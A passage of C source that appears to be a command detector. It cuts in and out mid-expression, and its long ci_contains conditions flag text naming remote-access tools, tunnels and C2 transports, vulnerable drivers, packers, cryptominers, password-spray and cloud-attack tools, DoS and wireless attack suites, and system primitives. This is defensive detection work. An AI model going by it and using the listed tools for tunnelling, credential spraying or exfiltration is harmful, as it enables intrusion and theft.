            (ci_contains(text, "velero") &&
             (ci_contains(text, " create") ||
              ci_contains(text, " delete") ||
              ci_contains(text, " restore") ||
              ci_contains(text, " download") ||
              ci_contains(text, " uninstall") ||
              ci_contains(text, " install"))) ||
            (ci_contains(text, "tkn") &&
             (ci_contains(text, " delete") ||
              ci_contains(text, " start") ||
              ci_contains(text, " cancel") ||
              ci_contains(text, " trigger") ||
              ci_contains(text, " pipelinerun") ||
              ci_contains(text, " taskrun"))) ||
            (ci_contains(text, "kn ") &&
             (ci_contains(text, " delete ") ||
              ci_contains(text, " apply ") ||
              ci_contains(text, " service ") ||
              ci_contains(text, " revision ") ||
              ci_contains(text, " route "))) ||
            (ci_contains(text, "argo ") &&
             (ci_contains(text, " submit ") ||
              ci_contains(text, " stop ") ||
              ci_contains(text, " delete ") ||
              ci_contains(text, " resubmit ") ||
              ci_contains(text, " retry ") ||
              ci_contains(text, " terminate ") ||
              ci_contains(text, " suspend "))) ||
            ci_contains(text, "buildctl") ||
            (ci_contains(text, "crun") &&
             (ci_contains(text, " exec") ||
              ci_contains(text, " run") ||
              ci_contains(text, " create") ||
              ci_contains(text, " delete") ||
              ci_contains(text, " kill"))) ||
            ci_contains(text, "jexec") ||
            (ci_contains(text, "toolbox") &&
             (ci_contains(text, " enter") ||
              ci_contains(text, " run") ||
              ci_contains(text, " create") ||
              ci_contains(text, " rm"))) ||
            (ci_contains(text, "distrobox") &&
             (ci_contains(text, " enter") ||
              ci_contains(text, " rm") ||
              ci_contains(text, " create") ||
              ci_contains(text, " ephemeral"))) ||
            /* rmm / remote-access tooling (legit tools, abused for
               persistence + lateral + exfil) */
            ci_contains(text, "teamviewer") ||
            ci_contains(text, "anydesk") ||
            ci_contains(text, "rustdesk") ||
            ci_contains(text, "screenconnect") ||
            ci_contains(text, "meshagent") ||
            ci_contains(text, "ninjarmm") ||
            ci_contains(text, "atera") ||
            ci_contains(text, "datto") ||
            ci_contains(text, "syncro") ||
            ci_contains(text, "splashtop") ||
            ci_contains(text, "realvnc") ||
            ci_contains(text, "tightvnc") ||
            ci_contains(text, "ultravnc") ||
            ci_contains(text, "nomachine") ||
            ci_contains(text, "dwagent") ||
            ci_contains(text, "dwservice") ||
            (ci_contains(text, "parsec") &&
             ci_contains(text, " -")) ||
            (ci_contains(text, "moonlight") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "hamachi") ||
            ci_contains(text, "logmein") ||
            ci_contains(text, "tacticalrmm") ||
            ci_contains(text, "simplehelp") ||
            (ci_contains(text, "supremo") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "aeroadmin") ||
            ci_contains(text, "ammyy") ||
            ci_contains(text, "impero") ||
            ci_contains(text, "sshx") ||
            ci_contains(text, "upterm") ||
            ci_contains(text, "xrdp") ||
            ci_contains(text, "remotepc") ||
            ci_contains(text, "litemanager") ||
            ci_contains(text, "mikogo") ||
            ci_contains(text, "goverlan") ||
            ci_contains(text, "optitune") ||
            ci_contains(text, "addigy") ||
            ci_contains(text, "quickassist") ||
            ci_contains(text, "islonline") ||
            ci_contains(text, "netop") ||
            ci_contains(text, "gocket") ||
            ci_contains(text, "beanywhere") ||
            ci_contains(text, "splashtop") ||
            /* modern proxy / tunnel / c2 transports */
            ci_contains(text, "sing-box") ||
            ci_contains(text, "mihomo") ||
            ci_contains(text, "hiddify") ||
            ci_contains(text, "naiveproxy") ||
            (ci_contains(text, "brook") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "tuic") ||
            ci_contains(text, "juicity") ||
            (ci_contains(text, "snell") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "v2fly") ||
            ci_contains(text, "ocserv") ||
            ci_contains(text, "tincd") ||
            (ci_contains(text, "tailscale") &&
             (ci_contains(text, " up") ||
              ci_contains(text, " login") ||
              ci_contains(text, " serve") ||
              ci_contains(text, " funnel") ||
              ci_contains(text, " ssh") ||
              ci_contains(text, " logout"))) ||
            (ci_contains(text, "zerotier") &&
             (ci_contains(text, " join") ||
              ci_contains(text, " leave") ||
              ci_contains(text, " set") ||
              ci_contains(text, "cli"))) ||
            (ci_contains(text, "netbird") &&
             (ci_contains(text, " up") ||
              ci_contains(text, " login") ||
              ci_contains(text, " down"))) ||
            (ci_contains(text, "nebula") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "headscale") ||
            ci_contains(text, "innernet") ||
            ci_contains(text, "netmaker") ||
            ci_contains(text, "nps") ||
            ci_contains(text, "npc") ||
            ci_contains(text, "suo5") ||
            (ci_contains(text, "venom") &&
             ci_contains(text, " -")) ||
            (ci_contains(text, "stowaway") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "iox") ||
            ci_contains(text, "rakshasa") ||
            ci_contains(text, "regory") ||
            ci_contains(text, "ssf") ||
            ci_contains(text, "pystinger") ||
            (ci_contains(text, "lcx ") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "htran") ||
            ci_contains(text, "rinetd") ||
            ci_contains(text, "redsocks") ||
            ci_contains(text, "tun2socks") ||
            ci_contains(text, "mosh-server") ||
            ci_contains(text, "localtunnel") ||
            (ci_contains(text, "expose") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "pagekite") ||
            (ci_contains(text, "bore") &&
             ci_contains(text, " -")) ||
            (ci_contains(text, "inlets") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "packetriot") ||
            ci_contains(text, "localxpose") ||
            ci_contains(text, "ztncui") ||
            (ci_contains(text, "tinc") &&
             (ci_contains(text, " init") ||
              ci_contains(text, " start") ||
              ci_contains(text, " join") ||
              ci_contains(text, " -c"))) ||
            /* BYOVD drivers + packers/protectors + shellcode */
            ci_contains(text, "kdmapper") ||
            ci_contains(text, "capcom.sys") ||
            ci_contains(text, "gdrv.sys") ||
            ci_contains(text, "dbutil") ||
            ci_contains(text, "rtcore64") ||
            ci_contains(text, "iqvw64e") ||
            ci_contains(text, "asrdrv") ||
            ci_contains(text, "vboxdrv") ||
            ci_contains(text, "hevd") ||
            ci_contains(text, "runpe") ||
            ci_contains(text, "themida") ||
            ci_contains(text, "vmprotect") ||
            ci_contains(text, "obsidium") ||
            ci_contains(text, "molebox") ||
            ci_contains(text, "mpress") ||
            ci_contains(text, "aspack") ||
            (ci_contains(text, "petite") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "kkrunchy") ||
            (ci_contains(text, "sgn") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "pe2sh") ||
            (ci_contains(text, "amber") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "inceptor") ||
            ci_contains(text, "pecloak") ||
            /* cryptominer names */
            (ci_contains(text, "t-rex") &&
             ci_contains(text, " -")) ||
            (ci_contains(text, "claymore") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "srbminer") ||
            ci_contains(text, "cryptotab") ||
            ci_contains(text, "ccminer") ||
            ci_contains(text, "wildrig") ||
            (ci_contains(text, "excavator") &&
             ci_contains(text, " -")) ||
            /* ad / recon / osint / cloud-attack names */
            (ci_contains(text, "cme ") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "adfind") ||
            ci_contains(text, "admod") ||
            ci_contains(text, "kekeo") ||
            (ci_contains(text, "certify") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "maigret") ||
            (ci_contains(text, "blackbird") &&
             ci_contains(text, " -")) ||
            (ci_contains(text, "snoop") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "toutatis") ||
            ci_contains(text, "instaloader") ||
            ci_contains(text, "osintgram") ||
            ci_contains(text, "git-dumper") ||
            ci_contains(text, "gitgraber") ||
            ci_contains(text, "dvcs-ripper") ||
            ci_contains(text, "uro ") ||
            (ci_contains(text, "unfurl") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "waymore") ||
            ci_contains(text, "linkfinder") ||
            ci_contains(text, "qsreplace") ||
            ci_contains(text, "cloudfox") ||
            (ci_contains(text, "pacu") &&
              (ci_contains(text, " -") || ci_contains(text, " --") ||
               ci_contains(text, " run ") || ci_contains(text, " module") ||
               ci_contains(text, " exec") || ci_contains(text, " session"))) ||
            ci_contains(text, "enumerate-iam") ||
            ci_contains(text, "prowler") ||
            ci_contains(text, "s3scanner") ||
            ci_contains(text, "s3enum") ||
            ci_contains(text, "bucketfinder") ||
            ci_contains(text, "awsbucketdump") ||
            ci_contains(text, "grayhatwarfare") ||
            ci_contains(text, "skyark") ||
            ci_contains(text, "weirdaal") ||
            ci_contains(text, "iamhound") ||
            ci_contains(text, "o365spray") ||
            ci_contains(text, "msolspray") ||
            ci_contains(text, "adfspray") ||
            ci_contains(text, "fireprox") ||
            ci_contains(text, "spray365") ||
            ci_contains(text, "trevorspray") ||
            ci_contains(text, "credmaster") ||
            ci_contains(text, "go365") ||
            (ci_contains(text, "ruler") &&
             ci_contains(text, " -")) ||
            /* phish kits + c2 extras + webshells */
            ci_contains(text, "evilnovnc") ||
            ci_contains(text, "cred-sniper") ||
            (ci_contains(text, "merlin") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "pupy") ||
            (ci_contains(text, "chaos") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "wsc2") ||
            ci_contains(text, "doctrack") ||
            (ci_contains(text, "chopper") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "tinyshell") ||
            ci_contains(text, "webhandler") ||
            ci_contains(text, "kubestriker") ||
            ci_contains(text, "kubelite") ||
            /* bcc / ebpf snoopers */
            ci_contains(text, "sslsniff") ||
            ci_contains(text, "bashreadline") ||
            ci_contains(text, "tcpconnect") ||
            ci_contains(text, "tcpaccept") ||
            ci_contains(text, "statsnoop") ||
            ci_contains(text, "capable") ||
            ci_contains(text, "funclatency") ||
            ci_contains(text, "argdist") ||
            ci_contains(text, "funccount") ||
            /* forensic / memory acquisition tools */
            ci_contains(text, "tsk_") ||
            (ci_contains(text, "fls") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "icat ") ||
            ci_contains(text, "mmls") ||
            (ci_contains(text, "autopsy") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "sleuthkit") ||
            ci_contains(text, "dcfldd") ||
            ci_contains(text, "dc3dd") ||
            ci_contains(text, "ddrescue") ||
            ci_contains(text, "safecopy") ||
            (ci_contains(text, "foremost") &&
             ci_contains(text, " -")) ||
            (ci_contains(text, "scalpel") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "magicrescue") ||
            (ci_contains(text, "lime") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "fmem") ||
            ci_contains(text, "memdump") ||
            ci_contains(text, "mdd") ||
            ci_contains(text, "makedumpfile") ||
            ci_contains(text, "vmss2core") ||
            /* fim / edr / host-monitor names (recon or kill target) */
            ci_contains(text, "osqueryi") ||
            (ci_contains(text, "velociraptor") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "ossec") ||
            (ci_contains(text, "samhain") &&
             ci_contains(text, " -")) ||
            (ci_contains(text, "aide") &&
             ci_contains(text, " --")) ||
            (ci_contains(text, "tripwire") &&
             ci_contains(text, " --")) ||
            ci_contains(text, "wazuh") ||
            ci_contains(text, "afick") ||
            ci_contains(text, "integrit") ||
            /* mitmproxy / dsniff suite / dos tools */
            ci_contains(text, "mitmdump") ||
            ci_contains(text, "urlsnarf") ||
            ci_contains(text, "filesnarf") ||
            ci_contains(text, "mailsnarf") ||
            ci_contains(text, "msgsnarf") ||
            ci_contains(text, "sshmitm") ||
            ci_contains(text, "webmitm") ||
            ci_contains(text, "webspy") ||
            ci_contains(text, "tcpkill") ||
            ci_contains(text, "tcpnice") ||
            ci_contains(text, "slowhttptest") ||
            (ci_contains(text, "goldeneye") &&
             ci_contains(text, " -")) ||
            (ci_contains(text, "hulk") &&
             ci_contains(text, " -")) ||
            (ci_contains(text, "rudy") &&
             ci_contains(text, " -")) ||
            ci_contains(text, "torshammer") ||
            ci_contains(text, "pyloris") ||
            ci_contains(text, "ufonet") ||
            ci_contains(text, "xerxes") ||
            /* thc-ipv6 suite */
            ci_contains(text, "thc-ipv6") ||
            ci_contains(text, "atk6-") ||
            ci_contains(text, "denial6") ||
            ci_contains(text, "dos-new-ip6") ||
            ci_contains(text, "flood_router6") ||
            ci_contains(text, "flood_mld") ||
            ci_contains(text, "flood_dhcpc6") ||
            ci_contains(text, "flood_rs6") ||
            ci_contains(text, "flood_advertise6") ||
            ci_contains(text, "flood_redir6") ||
            ci_contains(text, "flood_solicitate6") ||
            ci_contains(text, "flood_router26") ||
            ci_contains(text, "fake_router6") ||
            ci_contains(text, "fake_dns6d") ||
            ci_contains(text, "fake_dhcps6") ||
            ci_contains(text, "fake_mld6") ||
            ci_contains(text, "fake_mld26") ||
            ci_contains(text, "fake_solicitate6") ||
            ci_contains(text, "fake_advertise6") ||
            ci_contains(text, "kill_router6") ||
            ci_contains(text, "ndpexhaust") ||
            ci_contains(text, "thcping6") ||
            ci_contains(text, "thcsyn6") ||
            ci_contains(text, "smurf6") ||
            ci_contains(text, "rsmurf6") ||
            ci_contains(text, "toobig6") ||
            ci_contains(text, "trace6 ") ||
            ci_contains(text, "fuzz_ip6") ||
            ci_contains(text, "inject_alive6") ||
            ci_contains(text, "passive_discovery6") ||
            ci_contains(text, "dnsdict6") ||
            ci_contains(text, "dnsrevenum6") ||
            ci_contains(text, "dump_router6") ||
            ci_contains(text, "exploit6") ||
            ci_contains(text, "sendpees") ||
            ci_contains(text, "node_query6") ||
            ci_contains(text, "randicmp6") ||
            ci_contains(text, "redir6") ||
            /* snmp / ike / zip-pw crackers */
            ci_contains(text, "onesixtyone") ||
            ci_contains(text, "snmpwalk") ||
            ci_contains(text, "snmpget") ||
            ci_contains(text, "snmpset") ||
            ci_contains(text, "snmpcheck") ||
            ci_contains(text, "ike-scan") ||
            ci_contains(text, "psk-crack") ||
            ci_contains(text, "vpnc") ||
            ci_contains(text, "swanctl") ||
            ci_contains(text, "racoon") ||
            ci_contains(text, "fcrackzip") ||
            ci_contains(text, "pdfcrack") ||
            ci_contains(text, "rarcrack") ||
            ci_contains(text, "pkcrack") ||
            ci_contains(text, "bkcrack") ||
            ci_contains(text, "rcrack") ||
            ci_contains(text, "ophcrack") ||
            ci_contains(text, "cowpatty") ||
            ci_contains(text, "asleap") ||
            ci_contains(text, "pyrit") ||
            ci_contains(text, "eapeak") ||
            /* wifi attack extras */
            ci_contains(text, "hcxdumptool") ||
            ci_contains(text, "hcxpcapngtool") ||
            ci_contains(text, "besside-ng") ||
            ci_contains(text, "airdecap-ng") ||
            ci_contains(text, "tkiptun-ng") ||
            ci_contains(text, "wesside-ng") ||
            ci_contains(text, "packetforge-ng") ||
            ci_contains(text, "airolib-ng") ||
            ci_contains(text, "easside-ng") ||
            ci_contains(text, "airserv-ng") ||
            ci_contains(text, "ivstools") ||
            ci_contains(text, "makeivs-ng") ||
            ci_contains(text, "buddy-ng") ||
            ci_contains(text, "create_ap") ||
            ci_contains(text, "fern-wifi") ||
            ci_contains(text, "linset") ||
            ci_contains(text, "wpa_cli") ||
            /* bluetooth / nfc / can / scada extras */
            ci_contains(text, "spooftooph") ||
            ci_contains(text, "redfang") ||
            ci_contains(text, "bluesnarfer") ||
            ci_contains(text, "bluelog") ||
            ci_contains(text, "btscanner") ||
            ci_contains(text, "l2ping") ||
            ci_contains(text, "sdptool") ||
            ci_contains(text, "obexftp") ||
            ci_contains(text, "ussp-push") ||
            (ci_contains(text, "chameleon") &&
             (ci_contains(text, " mini") ||
              ci_contains(text, " -"))) ||
            ci_contains(text, "rfidiot") ||
            ci_contains(text, "ykman") ||
            ci_contains(text, "pkcs11-tool") ||
            ci_contains(text, "pkcs15") ||
            ci_contains(text, "opensc-tool") ||
            ci_contains(text, "pcsc_scan") ||
            ci_contains(text, "yubico-piv-tool") ||
            ci_contains(text, "cardpeek") ||
            ci_contains(text, "mifare") ||
            ci_contains(text, "cansend") ||
            ci_contains(text, "candump") ||
            ci_contains(text, "canplayer") ||
            ci_contains(text, "cansniffer") ||
            ci_contains(text, "isotpsend") ||
            ci_contains(text, "slcand") ||
            ci_contains(text, "plcscan") ||
            ci_contains(text, "s7scan") ||
            ci_contains(text, "mbtget") ||
            ci_contains(text, "diagslave") ||
            ci_contains(text, "opcua-client") ||
            ci_contains(text, "iec104") ||
            ci_contains(text, "dnp3") ||
            ci_contains(text, "enip") ||
            ci_contains(text, "s7comm") ||
            ci_contains(text, "plcinjector") ||
            ci_contains(text, "melsec") ||
            ci_contains(text, "codesys") ||
            /* remaining windows primitives */
            ci_contains(text, "mofcomp") ||
            ci_contains(text, "wbemtest") ||
            (ci_contains(text, "msdt") &&
             (ci_contains(text, " -path") ||
              ci_contains(text, " /id") ||
              ci_contains(text, " /path") ||
              ci_contains(text, ".diagcab"))) ||
            ci_contains(text, "sdiageng") ||
            (ci_contains(text, "mmc") &&
             (ci_contains(text, ".msc") ||
              ci_contains(text, " -a")) ) ||
            ci_contains(text, "winhelp") ||
            (ci_contains(text, "setx") &&
             ci_contains(text, " /m")) ||
            (ci_contains(text, "cipher") &&
             (ci_contains(text, " /e") ||
              ci_contains(text, " /d") ||
              ci_contains(text, " /w") ||
              ci_contains(text, " /x") ||
              ci_contains(text, " /k"))) ||
            (ci_contains(text, "fsutil") &&
             (ci_contains(text, " volume dismount") ||
              ci_contains(text, " hardlink") ||
              ci_contains(text, " reparsepoint") ||
              ci_contains(text, " resource") ||
              ci_contains(text, " quota") ||
              ci_contains(text, " objectid") ||
              ci_contains(text, " 8dot3name strip") ||
              ci_contains(text, " dirty set"))) ||
            (ci_contains(text, "mountvol") &&
             (ci_contains(text, " /p") ||
              ci_contains(text, " /d") ||
              ci_contains(text, " /r"))) ||
            (ci_contains(text, "subst") &&
             (ci_contains(text, " c:") ||
              ci_contains(text, " d:") ||
              ci_contains(text, " e:") ||
              ci_contains(text, " \\") ||
              ci_contains(text, ".exe") ||
              ci_contains(text, ".bat") ||
              ci_contains(text, ".ps1"))) ||
            ci_contains(text, "wecutil") ||
            ((ci_contains(text, "netsh wfp") &&
              ci_contains(text, " capture")) ||
             (ci_contains(text, "netsh winhttp") &&
              ci_contains(text, " set"))) ||
            (ci_contains(text, "wpr") &&
             (ci_contains(text, " -start") ||
              ci_contains(text, " -stop") ||
              ci_contains(text, " -cancel") ||
              ci_contains(text, " -status"))) ||
            (ci_contains(text, "xperf") &&
             (ci_contains(text, " -on") ||
              ci_contains(text, " -d") ||
              ci_contains(text, " -stop") ||
              ci_contains(text, " -start") ||
              ci_contains(text, " -end"))) ||
            ci_contains(text, "tracerpt") ||
            (ci_contains(text, "relog") &&
             ci_contains(text, " ")) ||
            ci_contains(text, "imagex") ||
            (ci_contains(text, "appcmd") &&
             (ci_contains(text, " add") ||
              ci_contains(text, " delete") ||
              ci_contains(text, " set") ||
              ci_contains(text, " install") ||
              ci_contains(text, " start") ||
              ci_contains(text, " stop") ||
              ci_contains(text, " recycle"))) ||
            (ci_contains(text, "aspnet_regiis") &&
             ci_contains(text, " -")) ||
            (ci_contains(text, "gacutil") &&
             (ci_contains(text, " /u") ||
              ci_contains(text, " /i") ||
              ci_contains(text, " /r"))) ||
            (ci_contains(text, "ngen") &&
             (ci_contains(text, " uninstall") ||
              ci_contains(text, " install") ||
              ci_contains(text, " executequeueditems") ||
              ci_contains(text, " update"))) ||
            (ci_contains(text, "devenv") &&
             (ci_contains(text, " /command") ||
              ci_contains(text, " /run") ||
              ci_contains(text, " /r "))) ||
            ci_contains(text, "csi ") ||
            ci_contains(text, "fsi ") ||
            ci_contains(text, "scriptcs") ||
            ci_contains(text, "dotnet-script") ||
            ci_contains(text, "usoclient") ||
            ci_contains(text, "wuauclt") ||
            /* remaining unix primitives */
            (ci_contains(text, "keyctl") &&
             (ci_contains(text, " dump") ||
              ci_contains(text, " print") ||
              ci_contains(text, " pipe") ||
              ci_contains(text, " search") ||
              ci_contains(text, " update") ||
              ci_contains(text, " revoke") ||
              ci_contains(text, " negate") ||
              ci_contains(text, " purge"))) ||
            (ci_contains(text, "sbctl") &&
             (ci_contains(text, " enroll") ||
              ci_contains(text, " sign") ||
              ci_contains(text, " create") ||
              ci_contains(text, " remove") ||
              ci_contains(text, " reset"))) ||
            ci_contains(text, "sbsign") ||
            (ci_contains(text, "fio") &&
             ci_contains(text, "/dev/")) ||
            ci_contains(text, "badblocks -w") ||
            ci_contains(text, "sg_persist") ||
            (ci_contains(text, "ndctl") &&
             (ci_contains(text, " destroy") ||
              ci_contains(text, " disable") ||
              ci_contains(text, " init-labels") ||
              ci_contains(text, " zero-labels") ||
              ci_contains(text, " sanitize") ||
              ci_contains(text, " create-namespace") ||
              ci_contains(text, " start-scrub"))) ||
            (ci_contains(text, "ipmctl") &&
             (ci_contains(text, " delete") ||
              ci_contains(text, " create") ||
              ci_contains(text, " format") ||
              ci_contains(text, " sanitize"))) ||
            ci_contains(text, "binfmt_misc/register") ||
            ci_contains(text, "systemd-sysusers") ||
            ci_contains(text, "systemd-firstboot") ||
            (ci_contains(text, "portablectl") &&
             (ci_contains(text, " attach") ||
              ci_contains(text, " detach") ||
              ci_contains(text, " reattach"))) ||
            ci_contains(text, "ld-linux") ||
            ci_contains(text, "ld-musl") ||
            ci_contains(text, "ld.so.2") ||
            (ci_contains(text, "flatpak-spawn") &&
             ci_contains(text, "--host")) ||
            (ci_contains(text, "gdbus") &&
             (ci_contains(text, " call ") ||
              ci_contains(text, " emit ") ||
              ci_contains(text, " monitor "))) ||
            ci_contains(text, "killall5") ||
            (ci_contains(text, "fuser") &&
             ci_contains(text, " -k")) ||
            (ci_contains(text, "accton") &&
             ci_contains(text, " off")) ||
            (ci_contains(text, "vconfig") &&
             (ci_contains(text, " add ") ||
              ci_contains(text, " rem "))) ||
            (ci_contains(text, "rfkill") &&
             (ci_contains(text, " block ") ||
              ci_contains(text, " unblock "))) ||
            (ci_contains(text, "update-rc.d") &&
             (ci_contains(text, " defaults") ||
              ci_contains(text, " remove") ||
              ci_contains(text, " enable") ||
              ci_contains(text, " disable"))) ||
            (ci_contains(text, "chkconfig") &&
             (ci_contains(text, " --add") ||
              ci_contains(text, " --del") ||
              ci_contains(text, " on") ||
              ci_contains(text, " off"))) ||
            (ci_contains(text, "opkg") &&
             (ci_contains(text, " install ") ||
              ci_contains(text, " remove ") ||
              ci_contains(text, " upgrade "))) ||
            (ci_contains(text, "emerge") &&
             (ci_contains(text, " --unmerge") ||
              ci_contains(text, " --depclean") ||
              ci_contains(text, " -c") ||
              ci_contains(text, " --sync"))) ||
            (ci_contains(text, "pkg ") &&
             (ci_contains(text, " install ") ||
              ci_contains(text, " delete ") ||
              ci_contains(text, " remove "))) ||
            (ci_contains(text, "snap") &&
             (ci_contains(text, " install ") ||
              ci_contains(text, " remove ") ||
              ci_contains(text, " refresh "))) ||
            (ci_contains(text, "flatpak") &&
             (ci_contains(text, " install ") ||
              ci_contains(text, " uninstall ") ||
              ci_contains(text, " override ") ||
              ci_contains(text, " kill ") ||
              ci_contains(text, " run "))) ||
            (ci_contains(text, "brew") &&
             (ci_contains(text, " install ") ||
              ci_contains(text, " uninstall ") ||
              ci_contains(text, " remove "))) ||
            (ci_contains(text, "port") &&
             (ci_contains(text, " install ") ||
              ci_contains(text, " uninstall "))) ||
            (ci_contains(text, "uv ") &&
             (ci_contains(text, " pip") ||
              ci_contains(text, " tool") ||
              ci_contains(text, " publish") ||
              ci_contains(text, "x"))) ||
            (ci_contains(text, "rye") &&
             (ci_contains(text, " add ") ||
              ci_contains(text, " remove ") ||
              ci_contains(text, " sync ") ||
              ci_contains(text, " install ") ||
              ci_contains(text, " publish "))) ||
            (ci_contains(text, "mamba") &&
             (ci_contains(text, " install ") ||
              ci_contains(text, " remove ") ||
              ci_contains(text, " uninstall "))) ||
            (ci_contains(text, "conda") &&
             (ci_contains(text, " install ") ||
              ci_contains(text, " remove ") ||
              ci_contains(text, " env remove"))) ||
            (ci_contains(text, "poetry") &&
             (ci_contains(text, " add ") ||
              ci_contains(text, " remove ") ||
              ci_contains(text, " publish ") ||
              ci_contains(text, " install "))) ||
            (ci_contains(text, "pdm") &&
             (ci_contains(text, " add ") ||
              ci_contains(text, " remove ") ||
              ci_contains(text, " publish ") ||
              ci_contains(text, " install "))) ||
            (ci_contains(text, "dotnet") &&
             (ci_contains(text, " tool ") ||
              ci_contains(text, " add ") ||
              ci_contains(text, " nuget push"))) ||
            (ci_contains(text, "cargo") &&
             (ci_contains(text, " add ") ||
              ci_contains(text, " owner ") ||
              ci_contains(text, " yank "))) ||
            (ci_contains(text, "nuget") &&
             (ci_contains(text, " install ") ||
              ci_contains(text, " push ") ||
              ci_contains(text, " delete "))) ||
            (ci_contains(text, "choco") &&
             (ci_contains(text, " install ") ||
              ci_contains(text, " uninstall ") ||
              ci_contains(text, " push "))) ||
            (ci_contains(text, "scoop") &&
             (ci_contains(text, " install ") ||
              ci_contains(text, " uninstall "))) ||
            (ci_contains(text, "winget") &&
             (ci_contains(text, " install ") ||
              ci_contains(text, " uninstall ") ||
              ci_contains(text, " import "))) ||
            ci_contains(text, "add-appxpackage") ||
            ci_contains(text, "remove-appxpackage") ||
            ci_contains(text, "msix ")) {
            what = "db-exfil/rmm/tunnel/byovd/cloud-attack/pkg primitive";
        }
        else if (
            /* jdk attach/exec primitives */
            ci_contains(text, "javaws") ||
            ci_contains(text, "jshell") ||
            ci_contains(text, "jjs ") ||
            ci_contains(text, "jmap") ||
            ci_contains(text, "jhat") ||
            ci_contains(text, "jstack") ||
            ci_contains(text, "jinfo") ||
            ci_contains(text, "jconsole") ||
            ci_contains(text, "jvisualvm") ||
            ci_contains(text, "jmc") ||
            ci_contains(text, "jsadebugd") ||
            (ci_contains(text, "jdb ") && ci_contains(text, " -")) ||
            ci_contains(text, "jcmd") ||
            ci_contains(text, "jps") ||
            ci_contains(text, "jstatd") ||
            /* interpreter exec surfaces */
            ci_contains(text, "escript ") ||
            (ci_contains(text, "groovy") && ci_contains(text, " -")) ||
            ci_contains(text, "dart run ") ||
            ci_contains(text, "zig run ") ||
            ci_contains(text, "crystal run ") ||
            ci_contains(text, "sbcl") ||
            (ci_contains(text, "newlisp") && ci_contains(text, " -")) ||
            (ci_contains(text, "factor") && ci_contains(text, " -run")) ||
            ci_contains(text, "gforth") ||
            (ci_contains(text, "ghc") && ci_contains(text, " -e")) ||
            ci_contains(text, "luajit") ||
            (ci_contains(text, "mruby") && ci_contains(text, " -")) ||
            ci_contains(text, "ponyc") ||
            (ci_contains(text, "janet") &&
             (ci_contains(text, " -") || ci_contains(text, ".janet"))) ||
            (ci_contains(text, "fennel") &&
             (ci_contains(text, " -") || ci_contains(text, ".fnl"))) ||
            (ci_contains(text, "hy") &&
             (ci_contains(text, " -") || ci_contains(text, ".hy"))) ||
            (ci_contains(text, "bb") && ci_contains(text, " -e")) ||
            ci_contains(text, "babashka") ||
            ci_contains(text, "nbb") ||
            (ci_contains(text, "joker") && ci_contains(text, " -")) ||
            (ci_contains(text, "matlab") &&
             (ci_contains(text, " -r") || ci_contains(text, " -batch") ||
              ci_contains(text, " -nodisplay"))) ||
            (ci_contains(text, "scilab") &&
             (ci_contains(text, " -e") || ci_contains(text, " -f") ||
              ci_contains(text, " -nwni"))) ||
            (ci_contains(text, "gp ") && ci_contains(text, " -")) ||
            (ci_contains(text, "gap ") && ci_contains(text, " -")) ||
            /* sysinternals recon/kill/cred suite */
            ci_contains(text, "pssuspend") ||
            ci_contains(text, "psping") ||
            ci_contains(text, "psloggedon") ||
            ci_contains(text, "psgetsid") ||
            ci_contains(text, "psfile") ||
            ci_contains(text, "psloglist") ||
            ci_contains(text, "pspasswd") ||
            ci_contains(text, "listdlls") ||
            ci_contains(text, "procexp") ||
            ci_contains(text, "procmon") ||
            ci_contains(text, "tcpview") ||
            ci_contains(text, "rammap") ||
            ci_contains(text, "vmmap") ||
            ci_contains(text, "winobj") ||
            ci_contains(text, "livekd") ||
            ci_contains(text, "du64") ||
            ci_contains(text, "efsdump") ||
            ci_contains(text, "adexplorer") ||
            ci_contains(text, "adinsight") ||
            ci_contains(text, "adrestore") ||
            ci_contains(text, "coreinfo") ||
            ci_contains(text, "pendmoves") ||
            ci_contains(text, "movefile") ||
            ci_contains(text, "sigcheck") ||
            ci_contains(text, "diskview") ||
            ci_contains(text, "ldmdump") ||
            ci_contains(text, "ntfsinfo") ||
            ci_contains(text, "shareenum") ||
            ci_contains(text, "shellrunas") ||
            ci_contains(text, "bginfo") ||
            (ci_contains(text, "desktops") && ci_contains(text, " -")) ||
            ci_contains(text, "hex2dec") ||
            ci_contains(text, "notmyfault") ||
            ci_contains(text, "portmon") ||
            ci_contains(text, "regdelnull") ||
            ci_contains(text, "regjump") ||
            ci_contains(text, "volumeid") ||
            ci_contains(text, "debugview") ||
            ci_contains(text, "sysmon") ||
            ci_contains(text, "clockres") ||
            (ci_contains(text, "contig ") && ci_contains(text, " -")) ||
            ci_contains(text, "findlinks") ||
            (ci_contains(text, "junction") &&
             (ci_contains(text, " -") || ci_contains(text, " c:"))) ||
            /* smb/ad/ldap write + enum */
            ci_contains(text, "rpcenum") ||
            ci_contains(text, "nbtscan") ||
            ci_contains(text, "smbget") ||
            ci_contains(text, "smbtar") ||
            ci_contains(text, "smbtree") ||
            ci_contains(text, "samba-tool") ||
            ci_contains(text, "smbcacls") ||
            ci_contains(text, "smbcquotas") ||
            ci_contains(text, "pdbedit") ||
            ci_contains(text, "smbpasswd") ||
            ci_contains(text, "sssctl") ||
            ci_contains(text, "sss_cache") ||
            ci_contains(text, "sss_obfuscate") ||
            ci_contains(text, "sss_seed") ||
            ci_contains(text, "sss_override") ||
            ci_contains(text, "ldbedit") ||
            ci_contains(text, "ldbsearch") ||
            ci_contains(text, "ldbadd") ||
            ci_contains(text, "ldbdel") ||
            ci_contains(text, "tdbdump") ||
